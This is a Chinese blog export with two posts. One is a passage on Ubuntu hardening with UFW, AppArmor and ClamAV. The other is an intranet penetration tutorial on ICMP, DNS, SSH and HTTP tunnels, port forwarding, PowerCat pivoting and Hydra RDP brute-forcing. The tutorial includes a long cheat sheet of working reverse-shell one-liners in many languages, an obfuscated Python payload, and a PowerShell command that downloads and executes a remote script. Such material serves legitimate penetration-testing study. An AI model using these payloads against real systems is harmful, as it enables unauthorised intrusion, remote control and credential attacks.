net/ipv6/conf/all/forwarding=1 # sudo sysctl -p ufw disable ufw enable 路由模式规则 # 启用路由功能(转发数据包)，先添加规则再开启路由也可 # 7个：源网卡接口，目的网卡接口，源ip，目的ip，源端口(很少做限制)，目的端口，通信协议 sudo ufw route allow in on eth1 out on eth2 # eth1网卡in的流量， eth2出的流量 sudo ufw route allow in on eth1 out on eth2 to 192.167.11 port 80 proto tcp 限制连接频率 # 尽量规避暴力破解 ufw limit ssh/tcp # 30s超过6次就deny 安全相关UFW作为网络防火墙(先开启路由转发) IP遮盖 # sudo vi /etc/default/ufw DEFAULT_FORWARD_POLICY="ACCEPT" # sudo vi /etc/ufw/sysctl.conf net/ipv4/ip_forward=1 # 启用路由功能 # sudo vi /etc/ufw/before.rules *nat # 开启nat地址转换 ：POSTROUTING ACCEPT [0:0] # 接收路由转发 -A POSTROUTING -s 10.8.0.0/8 -o enp0s3 -j MASQUERADE # 添加规则：制定来源内网网段，指定另一个有公网ip的的网卡然后进行地址转换并发出去 COMMIT # 完整语法规则 sudo ufw route allow/reject/deny/limit insert/delete/pretend in on eth0 out on eth1 from 1.1.1.1 oport 1:65535 to 2.2.2.2 port 22 proto tcp/udp/igmp/esp/ah # 如果不指定规则id位置，就默认在后面依次；pretend是依次从前面添加 小技巧 – 应用程序 # 为非标准端口的应用定义名称 # 为每个开放端口的服务程序分别定义程序配置文件 /etc/ufw/applications.d/ sudo ufw allow from 192.168.0.0/24 to any app CUPS sudo ufw app into CUPS [&lt;name>] title=&lt;title> description=&lt;description> portd=&lt;ports> ports=12/udp|32|56,78:90/tcp # 竖线隔开 # 应用防火墙规则 sudo ufw app update &lt;name> # 适用情景： 非标准业务的服务端口，一个应用同时绑定多个端口，业务描述也可以添加进去，修改也方便 日志功能 UFW默认不记录日志，因为占用存储空间 日志的价值在于：识别攻击、规则排错、诊断问题 # 全局开启日志，以及级别 / 关闭日志 sudo ufw logging on|off|LEVEL(LOW/medium/high/full) # 存储位置：/var/log/ufw.log # 单独为每条规则添加日志 sudo ufw allow log 22/tcp 恢复默认规则# 系统全新安装的状态(实在搞不清才使用，会提前备份->/etc/ufw/日期命名的文件) sudo ufw reset Shorewall适合任何网络的高级防火墙有图形管理界面 因为iptables语法有点麻烦，不想使用 AppArmor简介AppArmor是一个Linux安全模块 使不安全和不受信进程在受限的约束下运行 保证进程访问共享文件、行使特权、与其他进程通信 针对某一个进程层面 界面美观，操作较简单 全局强制访问控制机制(MAC) 基于LSM的额外安全功能 系统调用前，内核查询AppArmor策略，确定程序是否有权执行操作 不同与SELinux(过于庞大, 针对操作系统层面)，与用户无关，可用于限制超级用户权限（所有用户继承） 将进程限制在有限的系统资源之上 预设的控制机制，一定程度可预防未知安全漏洞（0day） Ubuntu默认的安全系统默认已安装并加载 控制策略 基于安装路径识别程序并控制 策略保存于相应配置文件(profile)中 集合高级静态分析和基于文件/etc/apparmor.d 部分安装包自带配置文件 使用安装额外配置文件 sudo apt install apparmor-profiles apparmor-profiles-extra # apparmor-profiles # 由上游社区管理维护的配置文件 # apparmor-profiles-extra # 由ubuntu、debian开发的配置文件 安装用户端管理工具 sudo apt install apparmor-utils 查看状态 sudo aa-status 控制模式 # enforcing 强制策略实施并记录被禁用请求 # complaining 只记录被禁请求，但不强制实施禁止 -->策略调试时候用 ## 切换模式 aa-enforce # 切换为强制模式 aa-complain # 切换为包容模式 aa-disable # 禁用指定pofile(不对这个程序做限制，不loaded) aa-audit # 审计模式，= enforce + 记录成功访问的请求(并不是很常见) 当前已经加载的配置文件 /sys/kernel/security/apparmor/profiles 配置文件命令 与可执行程序结对路径相同，/ -&gt; . 软连接将最终解析到目标程序 默认配置文件安装包携带并有效（bind9, mysql …）安装包携带但为空（mariadb）安装包无配置文件，额外包故障（samba） samba为例1.安装samba服务 # sudo apt install samba samba-common apparmor-profiles sudo aa-status #/etc/apparmor.d/usr.sbin.smbd # nmbd服务也可以 2.启用强制策略 sudo aa-enforce /usr/sbin/smbd # 对smbd进行策略限制 sudo aa-status 3.重启服务 sudo systemctl restart smbd # 会发现报错无法启动服务(因为配置文件有问题) tail /vat/log/syslog # 查看系统日志，发现 apparmor="DENIED"， 建议：从第一个DENIED开始往下看,一次修改一条 4.修正配置文件 sudo vi /etc/apparmor.d/usr.sbin.smbd ## 这里根据日志DENIED的内容来写（每一行都有逗号） /var/run/smbd rw, # path路径项权限 根据自己的写... capability net_admin, # capability进程权限 # 重新加载配置文件 sudo apparmor_parser -r usr.sbin.smbd # 重新加载所有配置文件 sudo systemctl reload apparmor.service # 然后重启服务，查看能不能起来，如果不能起来->继续查看日志和修改配置的步骤 sudo systemctl restart smbd sudo systemctl status smbd 。。。。。。 从头开始创建新的配置文件不建议对所有程序都做限制，主要面向对外/接收提供网络服务相关的程序(apache, samba, 浏览器等等容易遭受攻击的) # 查看进了行网络请求，但是没有apparmor配置文件对其进行保护的程序 sudo aa-unconfined sudo aa-unconfined --paranoid # 所有关联网络端口的进程 # 这里拿mtr作为例子 aa-genprof mtr # 指定对什么程序进行配置 mtr www.baidu.com # 运行示例程序 # 继续按照提示选择 # sudo apparmor_parse -r usr.bin.mtr sudo aa-logpro # 检查日志更新配置文件 防病毒 恶意软件病毒、木马、蠕虫、远控、僵尸程序、勒索、挖矿、漏洞利用 通常防病毒和Linux不会出现在同一句话里，BUT！ 专门针对Liunx发行版的恶意软件 没有100%有效的单个杀毒软件（病毒库互补） ClamAV: 开源免费全平台 ClamAV1.安装 sudo apt install clamav clamav-daemon # 如果只安装clamav，就不做自动监控；clamav-daemon 自动查杀 sudo apt install install libclamunrar6 # 对压缩包也查杀病毒 # 有桌面环境的话，可以安装客户端图形管理工具 2.更新病毒库 sudo systemctl stop clamav-freshclam # sudo freshclam # 会报错(因为他已经自动更新了)，可以先停止掉(上面)，再手动。也可以等待他更新完 less /var/log/clamav/freshclam.log # 可以查看日志记录 代理 sudo vi /etc/clamav/freshclam.conf HTTPProxyServer server_address HTTPPrpxyPort port_number 图形化前端工具 clamtk 3.手动扫描 # 扫描会占用系统资源，所以选择业务不是繁忙的时间来查杀 # 手动扫描的当前用户能扫描的位置 clamscan /home/xps -i -r # -r递归， -i显示 # --max-filesize 限制大小(超过大小就不会扫它)， --max-scansize最大扫多少(比如一个文件我只扫多少)， --exclude-dir排除目录 sudo clamscan --max-filesize=3999M --max-scansize=3999M --exclude-dir=/sys/* -i -r /home # 默认不具有杀毒能力，只是检测 # --remove 查到感染的文件，删除 # --bell 查到感染的文件，嘟嘟嘟提醒 # move=/tmp/VIRUS 查到感染的文件，移动到某个位置 # copy=/tmp/VIRUS 测试 wget http://www.eicar.org/download/eicar.com # 测试病毒文件,含毒，但是没破坏作用 clamscan -i -r ./ 4.扫描调度(定时任务) – 防止误杀(管理员要提前做好管理备份或者实时监视) at 13:00 tomorrow clamscan -i -r /home/xps freshclam &lt;EOF> &lt;CTRL-D> # 或者其他调度命令 crontab document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>UFW</tag>
        <tag>文件加密</tag>
        <tag>AppArmor</tag>
        <tag>ClamAV</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网第三章-隐藏隧道通信技术]]></title>
    <url>%2Fposts%2F35263%2F</url>
    <content type="text"><![CDATA[内网第三章-隐藏隧道通信技术内网连通性判断 常用判断方法1.ICMP协议 ping &lt;IP> 2.TCP协议 nc -zv &lt;IP> &lt;port> 3.HTTP协议 curl ip:port 4.DNS协议 # 1. nslookup www.baidu.com vps-ip # vps-ip是dns服务器的地址 # 2. dig @vps-ip www.baidu.com 若流量不能直接流出 常见于企业办公网段上网的场景 查看网络链接，判断是否存在与其他机器的8080(不绝对)等类似端口的连接(可以尝试运行ping -n 1 -a &lt;ip&gt;) 查看内网中是否有主机名类似于proxy的机器 查看IE浏览器的直接代理 根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。 执行以下命令，利用curl工具进行确认 curl www.baidu.com # 不通 curl -x proxy-ip:port www.baidu.com # 通 网络层隧道技术 IPv6隧道 ICMP隧道 IPv6隧道常见工具：socat,6tunnel,nt6tunnel等 概念：通过IPv6隧道传送IPv6数据报文(把IPv6报文整体封装在IPv4数据报文中，使得IPv6报文穿过IPv4海洋，到达另一个IPv6小岛)的技术 现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的操作系统支持IPv6，所有需要手动配置(win的网络属性中)Note：即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包 配置隧道与自动隧道的区别：只有在执行隧道功能的节点的IPv6地址是兼容IPv4地址时，自动隧道才是可行的。在为执行隧道功能的节点分配ip地址时，如果采用的是自动隧道方法，就不需要进行设置。配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如：DHCP/人工配置或其他IPv4的配置机制 防御：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信 ICMP隧道常见工具：icmpsh,PingTunnel,icmptunnel,powershell icmp等 比较特殊的协议，不用开放端口，最常见的ICMP消息为ping命令的回复。将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙。 工具1.icmpsh # 不需要管理员权限 # 简单，不存在正向反向 # 下载地址: https://github.com/inquisb/icmpsh # 本机和目标都要安装 # 安装依赖库 apt-get install python-impacket ### 使用 # 我机器执行 # 先关闭本地系统的icmp应答(恢复改为0就行) -> 否则会无限刷屏 sysctl -w net.ipv4.icmp_echo_ignore_all=1 ./run.sh # 输入目标的公网ip （此文件好像不对，用下面的py文件吧） # 或者 ./icmpsh_m.py IP(公网) IP(内网的公网ip) # 这个的公网ip获取方法：ping外面，在外面抓包获取数据包的源地址 / 访问外面的地址然后查看网站访问日志等 # 目标机器执行（这里使用的win版本） icmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128 # 192.168.1.7我的vps # 我的vps就会接收到反弹过来的shell 2.PingTunnel # 下载地址：http://freshmeat.sourceforge.net/projects/ptunnel/ # 貌似可以这么安装：sudo apt install ptunnel # 可跨平台使用。为了避免滥用，可为隧道设置密码 # 情景：得到的内网主机无法3389连接到数据库服务器，但是可以ping通。我们需以此机器为跳板访问另体贴数据库服务器 # 首先在两台机器都安装上此工具 ## 安装方法 #1.安装编译 tar -zxvf ... cd ... make &amp;&amp; make install #2.如果缺少pcap.h(数据包捕获函数库),就安装 wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz tar -zxvf ... cd ... ./configure #3.如果yacc包错误，安装 sudo apt-get install -y byacc sudo apt-get install flex bison #好了之后再安装一遍 ./configure make &amp;&amp; make install # 查看帮助信息 man pcap ## 使用方法 #4.运行PingTunnel(现在是linux上使用，也可在win上使用，只不过需要在内网的win服务器安装wincap类库) # 跳板机器(假设是已获取到的web服务器)： ptunnel -x shuteer111 # VPS上： ptunnel -p &lt;跳板_IP> -lp 1080 -da &lt;另一新目标_IP> -dp 3389 -x shuteer111 # 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为'ICMP隧道跳板'进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的) #5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口 参数说明： -x # 指定icmp隧道连接验证密码 -p # 指定icmp隧道另一端机器(跳板)的ip地址 -lp # 指定要监听的本地tcp端口 -da # 指定要转发的机器的ip地址 -dp # 指定要转发的机器的tcp端口 其他工具 防御方法通过Wireshark进行ICMP数据包分析，如下： 检查同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包 注意那些Payload大于64bit的ICMP数据包 寻找响应数据包的Payload与请求数据包中的Payload不一致的ICMP数据包 检查ICMP数据包的协议标签。例如：icmptunnel会在所有的ICMP Payload前面添加”TUNL”标记来标识隧道 -&gt; 这就是特征 传输层隧道技术传输层技术包括：TCP隧道、UDP隧道、常规端口转发等 若内网防火墙阻止了指定端口的访问，在获得目标主机权限后，可以使用iptables打开指定端口 1.lcx端口转发两个版本： Linux 版本：portmap Widows版本：lcx.exe 一个客户端一个服务端 lcx内网端口转发 先传lcx到目标机器 #在内网目标shell上: l cx -slave 公网ip 4444 127.0.0.1 3389 # 把目标机器的3389流量转发到指定服务器(vps)指定端口 #vps服务器(我的)上执行： lcx -listen 4444 33891 # 将本地4444端口上监听的所有数据转发到本机33891端口 #然后远程桌面连接本地的33891端口即可 lcx本地端口映射 # 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53) # 在目标主机执行 lcx -tran 53 &lt;目标ip>: 3389 linux版的portmap # 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip # vps ./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777 # 目标内网机器 ./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666 2.netcat安装 ## Linux # http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download #1. apt-get install netcat # 2. wget ... tar -zxvf ... cd ... ./configure make ## Windows https://joncraton.org/files/nc111nt.zip https://joncraton.org/files/nc111nt_safe.zip 参数 使用Banner抓取 # banner可标识服务的版本等信息 # 题外话:追踪路由 mtr 114.114.114.114 ## nc作为客户端： # 参数 -v 显示详细信息 # 参数 -n 如果是域名,不进行域名解析(建议直接跟ip地址) nc -nv 1.1.1.1 110 # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令） nc -nv 1.1.1.1 25 # smtp服务器 nc -nv 1.1.1.1 80 # 探测80端口(都可进行交互的命令) 连接到远程主机 nc -nvv 1.1.1.1 110 端口扫描 #并非擅长端口扫描, 还慢 #参数 -z 扫描参数，只判断是否开放（默认tcp） nc -nvz 1.1.1.1 20-8080 #参数 -u 扫描udp服务的端口 （不太准确） nc -nvzu 1.1.1.1 1-1024 端口监听 nc -l -p 999 # 习惯 nc -lvvp 9999 文件传输 # 一旦连接建立，数据流就会传入，接收文件 nc -lp 333 >1.txt # 发送文件内容 nc -nv 192.168.0.11 &lt; test.txt -q 1 #参数 -q: 输出完成之后过1秒就断开 简易聊天 nc -l -p 8888 nc -vn 192.168.0.11 8888 获取shell # 参考：https://www.uedbox.com/post/54632 # https://www.secpulse.com/archives/76223.html ##### nc正向shell（正向shell -> 内网服务器之间） 1.目标主机监听： nc -lvvp 4444 -e /bin/bash # linux nc -lvvp 4444 -e c:\\WINDOWS\system32\cmd.exe # win 2.本机连接目标 nc 192.168.1.11 4444 ##### nc反向shell 1.本机 nc -lvvp 3333 2.目标机器执行 nc 192.168.0.111 3333 -c /bin/bash # Linux nc 192.168.0.111 -e c:\\WINDOWS\system32\cmd.exe # win ###### 如果目标主机没有nc，获取反向shell ###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell # bash反弹shell /bin/bash -c bash -i >&amp; /dev/tcp/192.168.41.13/4444 0>&amp;1 # bash反弹shell(TCP) 目标机器： bash -i >&amp; /dev/tcp/192.168.41.133/4444 0>&amp;1 攻击方： nc -lvvp 4444 # bash反弹shell(UDP) 目标机器： bash -i >&amp; /dev/tcp/192.168.41.133/4444 0>&amp;1 攻击方监听： nc -u -lvp 4444 # python反向shell // 方法一 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' // 方法二 $ export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' # windows python反弹shell C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))" # php反向shell php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");' # Perl反向shell perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};' # perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt;>;' #NOTE: Windows only perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt;>;' # Ruby反向shell ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)' #不依赖于/bin/sh的反弹shell ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' #如果目标系统运行Windows反弹shell ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' # Lua反向shell #Linux lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');" #Windows lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' # Java反弹shell r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"] as String[]) p.waitFor() # socat反弹shell socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.79.137:5555 # Golang反弹shell echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go # Telnet反弹shell rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p #获取反弹shell后，可使用python获得交互式shell python -c'import pty; pty.spawn("/bin/bash")' python -c ''' import pty while(1): try: pty.spawn("/bin/bash") except : contiune''' # Nodejs反弹shell (function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8080, "10.17.26.64", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); or require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') or -var x = global.process.mainModule.require -x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash') or https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py # ncat反向shell ncat 127.0.0.1 4444 -e /bin/bash ncat --udp 127.0.0.1 4444 -e /bin/bash # 加密 A: ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl #被控端(服务器端) -allow允许连接的ip， 端口, ssl加密 B: ncat -nv 192.168.1.19 3333 --ssl #攻击端 # 监听端口 ncat -lvvp 777 # OpenSSL反弹shell # crontab反弹shell # MSF生成反弹shell # Powershell反弹shell powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() # 或 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" # 或 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') 内网代理 # 场景：通过拿到的一台能访问的内网主机1，作为跳板(vps不能直接访问内网主机2)，拿到另外一台内网主机1才能访问到的内网主机2的shell # vps监听 nc -lvp 3333 # 内网主机2执行 nc -lvp 3333 -e /bin/bash # 内网主机1(边界服务器)执行 nc -v vps_ip -c "nc -v 内网主机2_ip 3333" 3.PowerCat 可以说是nc的powershell版本 下载地址：https://github.com/besimorhino/powercat.git 用法# 导入模块 Import-Moudle .\powercat.ps1 既然说是nc的powershell版本，那就可以与nc配合连接:1.通过nc正向连接powercat # 目标机器用powercat监听 powercat -l -p 8080 cmd.exe -v # 攻击机连接 nc 192.168.56.130 8080 -vv #参数 -l # 监听 -p # 指定端口 -c # 指定要启动进程的名字 -v # 显示详情 2.通过nc反向连接powercat # 攻击机器监听 nc -lvv -p 8888 # 目标机器用powercat连接我们 powercat -c 192.168.56.129 -p 8888 -v -e cmd.exe 通过powercat返回powershell # 如果想返回powershell，就无法与nc进行交互 # 建立正向shell # 在目标机器执行 IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.1/powercat.ps1"); powercat -l -p 9999 -v # 在客户端 powercat -c 10.10.10.129 -p 9999 -v -ep # -ep用于返回powershell 通过powercat传递文件 # 服务端准备接收文件 powercat -l -p 9999 -of test.txt -v # -of 输出文件名 powercat -c 10.10.10.129 -p 9999 -i c:\1.txt -v # -i 输入：可写文件名，也可直接写字符串 用powercat生成payload # 有正向、反向，且可以进行编码 ## # 客户端生成 powercat -l -p 8888 -e cme -v -g >>shell.ps1 # 生成反弹shell的脚本 #或者生成反弹powershell的脚本 powercat -l -p 7777 -ep -v -g >>shell2.ps1 # 把生成的文件上传到目标并运行 # 然后在客户端执行 powercat -c 10.10.10.129 -p 8888 -v # 就会获得一个反弹shell ## 也可生成编码的payload # 客户端运行 powercat -c 10.10.10.129 -p 6666 -ep -ge # -ge 生成经过编码的payload # 目标运行 powershell -E "上面的编码" # 继续客户端执行 powercat -l -p 9999 -v PowerCat DNS隧道通信 # 由于其dns隧道是基于dnscat设计的，所以先下载安装编译它(放在目标机器Linux) # 下载地址：https://github.com/iagox86/dnscat2 git clone https://github.com/iagox86/dnscat2 cd dnscat2/server/ gem install bundler bundle install # 然后，目标机器执行 ruby dnscat2.rb ttpowercat.test -e open --no-cache # 回到我们的机器，执行 powercat -c 192.168.56.129 -p 53 -dns ttpowercat.tect -e cmd.exe # -dns表示使用dns进行通信 # 然后就能看到反弹回来的shell了 将powercat作为跳板 # 情景：vps可访问win7,但不能访问win server08 win7可访问win server08 # 以win7为跳板，来实现vps对win server08的访问 ### F1 #1.在win server08执行 powercat -l -v -p 9999 -e cmd.exe #2.在win7(跳板)执行 powercat -l -v -p 8000 -r tcp:10.10.10.129:9999 #3.vps上，连接win7 nc 192.168.56.130 8000 -vv # 连接成功 ### F2. 使用DNS协议 #1. win7上 powercat -l -p 8000 -r dns:192.168.56.129::ttpowercat.test # 指定vps的地址 #2. vps上执行，启动dnscat ruby dnscat2.rb ttpowercat.test -e open --no-cache #3. win server08(目标机器) powercat -c 10.10.10.128 -p 8000 -v -e cmd.exe # 就可以看到反弹shell了 powercat更多用法 ​```bash # https://github.com/besimorhino/powercat 应用层隧道技术 使用较多 1.SSH隧道参数 -C # 压缩传输(提高传输速度) -f # 后台执行 -N # 静默连接(建立了链接，但是看不到具体会话) -g # 允许远程主机链接本地用于转发的端口 -L # 本地端口转发 -R # 远程端口转发 -D # 动态转发(SOCKS代理) -P # 指定SSH端口 SSH配置文件 # vim /etc/ssh/sshd_config AllowTcpForwarding yes # 允许转发TCP协议 GatewayPorts yes # 是否允许逻辑主机本地转发端口 PermitRootLogin yes #允许root登录 PasseordAuthentication yes # 允许使用基于密码的认证 TCPKeepAlive yes # 阻止ssh断开 # 然后重启ssh服务 本地转发 # 情景：vps能访问web服务器，vps不能访问数据库服务器，web服务器能访问数据库服务器(需要以web服务器为跳板) # vps上执行 ssh -CfNg -L 1153(vps端口):1.1.1.10(目标):3389(目标端口) root@192.168.1.11(跳板机) # 输入跳板机器的密码 # 含义：将对方的3389端口映射到本地vps的1153上 etstat -antlup |grep "1153" # 查看本地端口正在监听 # 连接本地的1153，就可以链接对面的远程链接了 rdesktop 127.0.0.1:1153 # 其实就是一个正向的tcp连接 远程转发 # Web服务器(跳板机器)执行 ssh -CfNg -R 3307(vps端口):1.1.1.10(目标ip):3389(目标端口) root@192.168.1.4(vps地址) # 将目标的3389端口映射到远程vps的3307上 # 连接vps的3307，就可以链接对面的远程链接了 动态转发 # 动态端口映射就建立一个SSH加密的SOCKS 4/5代理通道，任何支持SOCKS 4/5的程序都可以使用这个加密通道进行代理访问 #1. vps上执行 ssh -CfNg -D 7000(vps端口) root@192.168.1.11(跳板机器地址) #2. 浏览器设置网络代理Socks 127.0.0.1:7000。通过浏览器访问内网的机器1.1.1.2的web资源 ... ... 防御思路 在系统中配置SSH远程管理白名单 在ACL中限制只有特定的IP地址才能连接SSH 以及设置系统完全使用带外管理等方法 如果没有足够的资源建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问策略(从外部到内部:从内部到外部) 2.HTTP/HTTPS隧道常用工具： reGeorg(reDuh)的升级版，把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机。流量特征明显，容易被杀软查杀 下载地址 meterpreter tunna(下载地址) 等等 reGeorg 工具支持很多种脚本 #1.先把脚本文件上传到目标服务器中，然后远程访问内网网站的某脚本文件 #2.在vps上使用reGeorgSocksProxy.py 脚本来连接 python reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p 9999 # 本机9999端口已经开始监听了 #3.配置ProxyChains，设置全局代理 vim /etc/proxychains.conf dynamic_chain socks4 127.0.0.1 9999 # 设置代理端口 #4.测试代理是否正常 proxyesolv www.baidu.com #5.使用proxychains打开应(通过隧道进行通信) proxychains firefox #6.就可以使用Hydra进行暴力破解rdp(使用http隧道，不会太明显) hydra 1.1.1.2 rdp -l administrator -P /root/pass.txt Hydra 暴力破解密码(支持很多协议) -R # 根据上一次进度继续破解 -S # 使用SSL协议连接 -s # 指定端口 -l # 指定用户名 -L # 指定用户名字典(文件) -p # 指定密码破解 -P # 制定密码字典(文件) -t # 